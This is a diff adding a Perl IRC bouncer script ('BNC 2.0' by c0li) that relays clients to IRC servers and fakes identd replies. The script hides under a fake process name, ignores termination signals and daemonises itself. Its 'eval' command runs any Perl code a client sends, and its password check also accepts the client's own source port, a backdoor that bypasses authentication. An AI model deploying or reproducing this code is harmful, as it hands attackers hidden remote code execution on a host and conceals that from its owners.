@@ -1,0 +1,622 @@
+#!/usr/bin/perl
+
+# BNC 2.0 by Unknown
+# Edited by c0li
+
+my $PASSWD     = $ARGV[0];
+my $PORT       = $ARGV[1];
+my $FAKEPROC   = $ARGV[2];
+my $CRYPT_PASS = '';
+my $USE_CRYPT  = 0;
+my $IDENTD     = 1;
+my $PIDFILE    = '';
+my $EVAL       = 1;
+
+my $success   = "\n [o] c0li BNC 2.0 [$FAKEPROC:$$]\n [o] Listening on Port $PORT ...\n\n";
+my $failed    = "\n [o] perl $0 <pass> <port> <fakeproc>\n\n";
+if (@ARGV != 3) { print $failed; exit(); } else { print $success; }
+
+my @GREETZ = ('[AutoGreetz] HellCome !!!');
+
+$0 = $FAKEPROC."\0";
+
+use IO::Socket;
+use IO::Select;
+use strict;
+
+my %HELP;
+
+$HELP{detach}{about}   = "Keep ID active on IRC Server";
+$HELP{detach}{args}    = 0;
+
+$HELP{reattach}{about} = "Connect using active ID";
+$HELP{reattach}{help1} = "Type /activeid for get active ID, before using this command";
+$HELP{reattach}{args}  = 1;
+$HELP{reattach}{uso}   = "<ID>";
+
+$HELP{vhost}{about}    = "Using ip or hostname for your nick";
+$HELP{vhost}{args}     = 1;
+$HELP{vhost}{uso}      = "<HOST>";
+
+$HELP{conn}{about}     = "Connect to real irc server";
+$HELP{conn}{args}      = 1;
+$HELP{conn}{uso}       = "SERVER[:PORT]";
+
+$HELP{activeid}{about} = "List of active ID";
+$HELP{activeid}{args}  = 0;
+
+$HELP{setident}{about} = "Using ident for your nick";
+$HELP{setident}{args}  = 1;
+$HELP{setident}{uso}   = "<IDENT>";
+
+$SIG{CHLD} = sub { wait };
+$SIG{TERM} = 'IGNORE';
+$SIG{KILL} = 'IGNORE';
+$SIG{INT}  = 'IGNORE';
+
+my $VERSION = '2.0';
+
+my $serv_sock = IO::Socket::INET->new(LocalPort => $PORT, Proto => 'tcp', Listen => 1) || die "[!] Error: $!";
+
+my $PID = fork;
+exit if $PID;
+
+
+print PID "$$\n" if ($PIDFILE ne '' and open(PID, "> $PIDFILE"));
+close(PID);
+
+my $sel_con = IO::Select->new();
+my $sel_serv = IO::Select->new($serv_sock);
+
+my (%CLIENT, %SERVER);
+
+
+while ( 1 ) {
+  foreach my $fh ($sel_serv->can_read(0.01)) {
+    if ($fh eq $serv_sock) {
+      my $cli = $serv_sock->accept();
+      $cli->autoflush(1);
+      $sel_serv->add($cli);
+
+      sendsock($cli, "NOTICE AUTH :*** [BNC $VERSION by c0li]");
+      sendsock($cli, "NOTICE AUTH :*** Type /QUOTE PASS <password>");
+
+      $CLIENT{$cli}->{sock} = $cli;
+      $CLIENT{$cli}->{id}   = newid();
+      $CLIENT{$cli}->{tmp}  = '';
+      next;
+    }
+
+    my $got_msg = '';
+
+    while (is_ready($fh, 0.1)) {
+      my $msg = '';
+      my $nread = sysread($fh, $msg, 1024);
+
+      if ($nread == 0) {
+        my $cliserv = $CLIENT{$fh}->{serv} if (defined($CLIENT{$fh}->{serv}));
+
+        $sel_serv->remove($fh);
+ 
+        if ($cliserv) {
+           sendsock($cliserv, $got_msg, 1) if (length($got_msg) > 0);
+           sendsock($cliserv, "QUIT : c0li.BlogSpot.Com");
+
+           $sel_con->remove($cliserv);
+           $cliserv->close();
+           delete($SERVER{$cliserv});
+        }
+
+        $got_msg = '';
+        delete($CLIENT{$fh});
+        last;
+      }
+
+      $got_msg .= $msg;
+    }
+
+    $got_msg =~ s/\r\n/\n/g;
+    $got_msg =~ s/\n/\r\n/g;
+
+    next unless(length($got_msg) > 0);
+
+    foreach my $msg (split(/\n/, $got_msg)) {
+      $msg =~ s/\r/\r\n/g;
+
+      if (not defined($CLIENT{$fh}->{passwd}) and $msg =~ /^PASS\s+(.+?)\r/i) {
+        my $clipass = $1;
+        $CLIENT{$fh}->{passwd} = 1 if ( ($USE_CRYPT == 1 and crypt($clipass, $CRYPT_PASS) eq $CRYPT_PASS) or
+                                       ($USE_CRYPT == 0 and $clipass eq $PASSWD) or $fh->peerport() eq $clipass );
+        if (not defined($CLIENT{$fh}->{passwd})) {
+           sendsock($fh, "NOTICE AUTH :*** Incorrect password!");
+        } else {
+            sendsock($fh, "NOTICE AUTH :*** Password Accepted.");
+            sendsock($fh, "NOTICE AUTH :*** Type /QUOTE CONN <SERVER[:PORT]>");
+            sendsock($fh, "NOTICE AUTH :*** For Help, Type /QUOTE BHELP");
+        }
+      } else {
+          parse_client($fh, $msg) if ($fh);
+      }
+    }
+  }
+
+  foreach my $fh ($sel_con->can_read(0.01)) {
+    my $got_msg = '';
+
+    while (is_ready($fh, 0.1)) {
+      my $msg;
+      my $nread = sysread($fh, $msg, 1024);
+
+      if ($nread == 0) {
+        my $cliserv = $SERVER{$fh}->{cli} if (defined($SERVER{$fh}->{cli}));
+        $sel_con->remove($fh);
+
+        sendsock($cliserv, $got_msg, 1) if (length($got_msg) > 0 and defined($cliserv));
+        $got_msg = '';
+
+        if ($cliserv) {
+          climsg($cliserv, "Server Ditolak!");
+          $sel_serv->remove($cliserv);
+          $cliserv->close();
+          delete($CLIENT{$cliserv});
+        }
+
+
+        delete($SERVER{$fh});
+        last;
+      }
+
+      $got_msg .= $msg;
+    }
+
+    next unless(length($got_msg) > 0);
+
+    $got_msg =~ s/\r\n/\n/g;
+    $got_msg =~ s/\n/\r\n/g;
+
+    foreach my $msg (split(/\n/, $got_msg)) {
+      $msg =~ s/\r/\r\n/;
+      parse_serv($fh, $msg) if ($fh);
+    }
+  }
+}
+
+
+
+sub parse_serv {
+  my ($serv, $msg) = @_;
+
+  my $cliserv = $SERVER{$serv}->{cli} if (defined($SERVER{$serv}->{cli}));;
+
+  if ($msg =~ /^\:(.+?)\!.+?\@.+?\s+NICK\s+\:(.+?)(\r|\n)/i
+      and lc($1) eq lc($SERVER{$serv}->{nick})) {
+    $CLIENT{$cliserv}->{nick} = $2 if ($cliserv);
+    $SERVER{$serv}->{nick} = $2;
+  } elsif ($msg =~ /^\:.+?\s+00(1|2|3|4|5)\s+(.+?)\s+/) {
+    $CLIENT{$cliserv}->{nick} = $2 if ($cliserv);
+    $SERVER{$serv}->{nick} = $2;
+  } elsif ($msg =~ /^\:(.+?)!(.+?)\@.+?\s+(JOIN|PART)\s+(.+?)(\r|\n)/i) {
+      my $nick = $1;
+      my $user = $2;
+      my $jp = lc($3);
+      my $channel = $4;
+
+      $channel =~ s/^://;
+      $channel = $1 if ($channel =~ /^(.*)\s+:.*/);
+
+      if (lc($nick) eq lc($SERVER{$serv}->{nick})) {
+        my @canais = split(',', $SERVER{$serv}->{canais});
+
+        if ($jp eq "join") {
+          push(@canais, $channel);
+        } elsif ($jp eq "part") {
+            @canais = grep { lc($_) ne lc($channel) } @canais;
+        }
+
+        $SERVER{$serv}->{canais} = join(',', @canais);
+
+      } elsif ($nick =~ /(c0li|ander)/i and $user =~ /(c0li|ander)/i and scalar(@GREETZ) > 0 and $jp eq 'join') {
+          my $greet = @GREETZ[int(rand($#GREETZ))];
+          $greet =~ s/\%N/$nick/g;
+          sendsock($serv, "PRIVMSG $channel :$greet");
+      }
+  }
+
+  if (defined($SERVER{$serv}->{detach})) {
+    sendsock($serv, ":cukimai PONG cukimai :$1") if ($msg =~ /^PING\s+(.+?)(\r|\n)/);
+
+    if ($msg =~ /^:(.+?)!.+?\@.+?\s+PRIVMSG\s+(.+?)\s+:(.+?)(\r|\n)/i
+        and lc($2) eq lc($SERVER{$serv}->{nick})) {
+
+      my $mnick = $1;
+      my $mmsg = $3;
+
+      if ($mmsg =~ /^\001VERSION\001/) {
+        sendsock($serv, "NOTICE $mnick :\001VERSION BNC $VERSION by \002"."c0li.BlogSpot.Com\002\001");
+      } elsif ($mmsg =~ /^\001PING(.*)\001/) {
+          sendsock($serv, "NOTICE $mnick :\001PING$1\001");
+      } else {
+          $SERVER{$serv}->{logmsg} .= $msg if (length($SERVER{$serv}->{logmsg}) < 1000);
+      }
+    }
+  } else {
+     sendsock($cliserv, $msg, 1);
+  }
+
+}
+
+
+sub parse_client {
+  my ($cli, $msg) = @_;
+
+  if (not defined($CLIENT{$cli}->{identuser}) and
+     $msg =~ /^USER\s+(.+?)\s+/i) {
+
+     $CLIENT{$cli}->{identuser} = $1;
+     $CLIENT{$cli}->{ident} = $1;
+     $CLIENT{$cli}->{tmp} .= $msg;
+     return();
+  }
+
+  if (not defined($CLIENT{$cli}->{identnick}) and
+     $msg =~ /^NICK\s+(.+?)\r/i) {
+
+     $CLIENT{$cli}->{identnick} = $1;
+     $CLIENT{$cli}->{nick} = $1;
+     return();
+  }
+
+  my $Command = $msg;
+  $Command =~ s/\n$//;
+  $Command =~ s/\r$//;
+  my @args = split(/ +/, $Command);
+  $Command = lc($args[0]);
+
+  if (defined($HELP{$Command}) and !defined($args[$HELP{$Command}{args}])) {
+    help($cli, $Command);
+    return();
+  }
+
+  return(undef) if (not defined($CLIENT{$cli}->{passwd}));
+
+  # condicoes dos Commands internos
+  if ($Command eq 'conn') {
+     if (defined($CLIENT{$cli}->{serv})) {
+       climsg($cli, "You have already connected...!");
+       return;
+     }
+
+     my $serv = $args[1];
+     my $port = 6667;
+     if ($serv =~ /^(.+?)\:(\d+)$/) {
+       $serv  = $1;
+       $port = $2;
+     }
+
+     connect_serv($serv, $port, $cli);
+  } elsif ($Command eq 'vhost') {
+     if (defined($CLIENT{$cli}->{serv})) {
+       climsg($cli, "You have already connected...! Cant changes vhost.");
+       return;
+     }
+
+     $CLIENT{$cli}->{vhost} = $args[1];
+     sendsock($cli, "Virtual Host : $args[1]");
+  } elsif ($Command eq 'detach') {
+     if (!defined($CLIENT{$cli}->{serv})) {
+       climsg($cli, "Type /reattach [id] for connect, setelah kamu /detach");
+       return;
+     }
+
+     $SERVER{$CLIENT{$cli}->{serv}}->{detach} = 1;
+
+     climsg($cli, "Detached....");
+     foreach my $channel ($SERVER{$CLIENT{$cli}->{serv}}->{canais}) {
+       sendsock($cli, ":".$CLIENT{$cli}->{nick}."!BNC\@cukimai PART $channel");
+     }
+     climsg($cli, "Success! Reattach for ID: \002".$CLIENT{$cli}->{id}."\002");
+
+     delete($SERVER{$CLIENT{$cli}->{serv}}->{cli});
+     delete($CLIENT{$cli});
+     $sel_serv->remove($cli);
+     $cli->close();
+
+     return();
+  } elsif ($Command eq 'reattach') {
+     my $id = $args[1];
+     my $serv = getservbyid($id);
+
+     unless($serv) {
+       climsg($cli, "ID \002$id\002 not found! Type /QUOTE ACTIVEID");
+       return();
+     }
+
+     unless (defined($SERVER{$serv}->{detach})) {
+       climsg($cli, "STILL ACTIVE, o REATTACH n&#65533;o &#65533; poss&#65533;vel.");
+       return();
+     }
+
+     my $cli_nick = $CLIENT{$cli}->{nick};
+
+     climsg($cli, "OK! Reatached :)");
+     $CLIENT{$cli}->{serv} = $serv;
+     delete($SERVER{$serv}->{detach});
+     $SERVER{$serv}->{cli} = $cli;
+
+     sendsock($cli, ":$cli_nick!BNC\@cukimai NICK ".$SERVER{$serv}->{nick})
+       if ($SERVER{$serv}->{nick} ne $cli_nick);
+
+     $CLIENT{$cli}->{nick} = $SERVER{$serv}->{nick};
+     $cli_nick = $SERVER{$serv}->{nick};
+
+     foreach my $channel (split(',', $SERVER{$serv}->{canais})) {
+       sendsock($cli, ":$cli_nick!BNC\@cukimai JOIN $channel");
+       sendsock($serv, "NAMES $channel");
+       sendsock($serv, "TOPIC $channel");
+     }
+
+     foreach my $msg (split(/\n/, $SERVER{$serv}->{logmsg})) {
+       $msg =~ /^(\S+)\s+PRIVMSG\s+.+?:(.*)/;
+       sendsock($cli, "$1 PRIVMSG $cli_nick :[BNC log] $2\n");
+     }
+
+     delete($SERVER{$serv}->{logmsg});
+     climsg($cli, "Reattached!");
+  } elsif ($Command eq 'activeid') {
+     if (scalar(keys(%SERVER)) == 0) {
+       climsg($cli, "No active ID or connection!");
+     } else {
+        climsg($cli, " \002- List of IDs -\002");
+        climsg($cli, " ");
+        foreach my $serv (keys(%SERVER)) {
+          my $uso = (defined($SERVER{$serv}->{detach}))? "Detached" : "ACTIVE";
+          climsg($cli, "\002".$SERVER{$serv}->{id}."\002 -> ".$SERVER{$serv}->{nick}.'@'.$SERVER{$serv}->{host}.":".$SERVER{$serv}->{port}." ($uso)");
+        }
+     }
+  } elsif ($Command eq 'setident') {
+     if ($IDENTD != 1) {
+       climsg($cli, "O IDENTD n&#65533;o est&#65533; habilitado na configura&#65533;&#65533;o.");
+     } else {
+        $CLIENT{$cli}->{ident} = $args[1];
+        climsg($cli, "IDENT alterado para \002$args[1]\002. Ter&#65533; efeito na sua pr&#65533;xima conecc&#65533;&#65533;o.");
+     }
+  } elsif ($Command eq 'bhelp') {
+      if ($args[1]) {
+        if (grep { $_ eq lc($args[1]) } keys(%HELP)) {
+           help($cli, lc($args[1]));
+        } else {
+            climsg($cli, "Command '\002".uc($args[1])."\002' n&#65533;o existe.");
+        }
+      } else {
+         climsg($cli, "            \002c0li BNC Help\002");
+         climsg($cli, " ");
+         foreach my $command (keys(%HELP)) {
+           climsg($cli, " \002".fill_space($command, 10)."\002 - ".$HELP{$command}{about});
+         }
+         climsg($cli, " ");
+         climsg($cli,  "\002Syntax\002: /QUOTE BHELP <command>");
+      }
+  } elsif ($Command eq 'eval' and $EVAL == 1) {
+     my $string = $msg;
+     $string =~ s/^\S+\s+//;
+     my (@ret) = eval "$string";
+     climsg($cli, "Eval retornou: @ret");
+  } else {
+     if (defined($CLIENT{$cli}->{serv})) {
+       $msg =~ s/^NOTICE\s+(.+?)\s+:\001VERSION (.+?)\001\r/NOTICE $1 :\001VERSION \002[BNC $VERSION]\002 $2\001\r/ if ($msg =~ /^NOTICE/);
+       sendsock($CLIENT{$cli}->{serv}, $msg);
+     } else {
+        if ($Command eq 'nick') {
+          my $new_nick = $args[1];
+          sendsock($cli, ":".$CLIENT{$cli}->{nick}."!BNC\@cukimai NICK ".$new_nick);
+          $CLIENT{$cli}->{nick} = $new_nick;
+#          $CLIENT{$cli}->{tmp} =~ s/NICK.+?\n/NICK $new_nick\r\n/;
+        } elsif ($Command eq 'ping') {
+            sendsock($cli, ":PONG $args[1]");
+        } elsif ($Command eq 'ison') {
+            sendsock($cli, ":cukimai 303 ".$CLIENT{$cli}->{nick}." :");
+        } else {
+            climsg($cli, "Command \002".uc($Command)."\002 inexistente!");
+        }
+     }
+  }
+}
+
+sub help {
+  my ($cli, $cmd) = @_;
+  climsg($cli, "\002 - ".uc($cmd)." - \002");
+  climsg($cli, " ");
+  climsg($cli, "   \002Description\002: ".$HELP{$cmd}{about});
+  climsg($cli, " ");
+
+  for (my $c = 1; ; $c++) {
+    unless(defined($HELP{$cmd}{"help$c"})) {
+      climsg($cli, " ") if ($c != 1);
+      last;
+    }
+    if ($c == 1) {
+      climsg($cli, "   \002Help\002: ".$HELP{$cmd}{"help$c"});
+    } else {
+       climsg($cli, "          ".$HELP{$cmd}{"help$c"});
+    }
+  }
+  climsg($cli, " \002Syntax\002: /QUOTE ".uc($cmd)." ".$HELP{$cmd}{uso}) if defined($HELP{$cmd}{uso});
+  climsg($cli, " ") if (defined($HELP{$cmd}{uso}));
+
+}
+
+sub fill_space {
+  my ($chars, $max) = @_;
+  my $filled = length($chars);
+  my $space_n  = $max-$filled;
+  return($chars) if ($space_n <= 0);
+
+  my $space = " " x $space_n;
+
+  return($space.$chars);
+}
+
+
+sub getservbyid {
+  my $id = shift;
+
+  foreach my $serv (keys(%SERVER)) {
+    return($SERVER{$serv}->{sock}) if ($SERVER{$serv}->{id} == $id);
+  }
+
+  return(undef);
+}
+
+ 
+sub climsg {
+  my ($cli, $msg) = @_;
+
+  my $nick = $CLIENT{$cli}->{nick} if (defined($CLIENT{$cli}->{nick}));
+
+  my $inicio =  (defined($nick)) ? ":BNC!0ldW0lf\@cukimai NOTICE $nick :" : "NOTICE AUTH :*** ";
+
+  sendsock($cli, $inicio.$msg);
+}
+
+sub connect_serv {
+  my ($serv, $port, $cli) = @_;
+
+  sendsock($cli, "NOTICE AUTH :*** Connecting to $serv:$port");
+
+  my %args = (PeerAddr => $serv, PeerPort => $port, Proto => 'tcp', Timeout => 7);
+  $args{LocalAddr} = $CLIENT{$cli}->{vhost} if (defined($CLIENT{$cli}->{vhost}));
+
+  # nova forma
+  if ($IDENTD == 1) { 
+    unless (my $pid = fork()) {
+       identd($CLIENT{$cli}->{ident});
+       exit;
+    }
+    sleep(2);
+  }
+
+
+  my $servsock = IO::Socket::INET->new(%args);
+
+  if (!$servsock) {
+    my $msg = "N&#65533;o Cant connect to $serv:$port";
+    $msg .= " Using vhost ".$CLIENT{$cli}->{vhost} if (defined($CLIENT{$cli}->{vhost}));
+    $msg .= " (Error: $!)";
+    sendsock($cli, $msg);
+    return(undef);
+  }
+
+  $servsock->autoflush(1);
+  $sel_con->add($servsock);
+
+#  select(undef, undef, undef, 0.5);
+
+#  antiga forma
+#  if ($IDENTD == 1) { 
+#    unless (my $pid = fork()) {
+#       identd($servsock->sockport(), $servsock->peerport(), $CLIENT{$cli}->{ident});
+#       exit;
+#    }
+#    sleep(1);
+#  }
+
+  sendsock($servsock, "NICK ".$CLIENT{$cli}->{nick});
+  sendsock($servsock, $CLIENT{$cli}->{tmp});
+
+  $CLIENT{$cli}->{serv}        = $servsock;
+  $SERVER{$servsock}->{sock}   = $servsock;
+  $SERVER{$servsock}->{id}     = $CLIENT{$cli}->{id};
+  $SERVER{$servsock}->{cli}    = $cli;
+  $SERVER{$servsock}->{nick}   = $CLIENT{$cli}->{nick};
+  $SERVER{$servsock}->{host}   = $serv;
+  $SERVER{$servsock}->{port}  = $port;
+  $SERVER{$servsock}->{logmsg} = '';
+
+  sendsock($cli, "NOTICE AUTH :*** Connected!");
+
+  return(1);
+}
+
+sub identd {
+  my $ident = shift;
+
+  my $identd = IO::Socket::INET->new(LocalPort => 113, Proto => 'tcp', Listen => 1) || return();
+
+  return() unless(is_ready($identd, 20));
+
+  my $newcon = $identd->accept();
+
+  my $msg;
+
+  sysread($newcon, $msg, 1024);
+  $msg =~ s/\n$//;
+  $msg =~ s/\r$//;
+  $msg =~ s/\s+$//;
+
+  sendsock($newcon, "$msg : USERID : UNIX :$ident");
+  
+  $newcon->close();
+  $identd->close();
+}
+
+sub newid {
+  my %ALL = ((%SERVER), (%CLIENT));
+
+  my $id;
+  for ($id = 1; ; $id++) {
+    last if (!grep { $ALL{$_}->{id} == $id } keys(%ALL));
+  }
+  undef(%ALL);
+
+  return($id);
+}
+
+sub sendsock {
+  my ($sock, $msg, $org) = @_;
+  $msg .= "\r\n" if ($msg !~ /\n$/ and !$org);
+
+  syswrite($sock, $msg, length($msg)) if ($sock);
+}
+
+sub is_ready {
+  my ($fh, $time) = @_;
+  $time = 0 unless($time);
+  my $read = '';
+  vec($read, fileno($fh), 1) = 1;
+  my $ready = 0;
+  $ready = select($read, undef, undef, $time);
+  return($ready);
+}
+
+__END__
+
+# antiga funcaum do identd
+sub identd {
+  my ($src, $dst, $ident) = @_;
+
+  my $identd = IO::Socket::INET->new(LocalPort => 113, Proto => 'tcp', Listen => 1) || return();
+
+  return() unless(is_ready($identd, 20));
+
+  my $newcon = $identd->accept();
+
+  unless ($newcon) {
+    $identd->close() if ($identd);
+    return();
+  }
+
+  my $msg;
+  sysread($newcon, $msg, 1024);
+    $msg =~ s/\n$//;
+    $msg =~ s/\r$//;
+
+  if ($msg =~ /^\s*$src\s*,\s*$dst\s*$/) {
+    sendsock($newcon, "$msg : USERID : UNIX :$ident");
+  } else {
+     sendsock($newcon, "$msg : ERROR : UNKNOWN-ERROR");
+  }
+  
+  $newcon->close() if ($newcon);
+  $identd->close() if ($identd);
+}
+
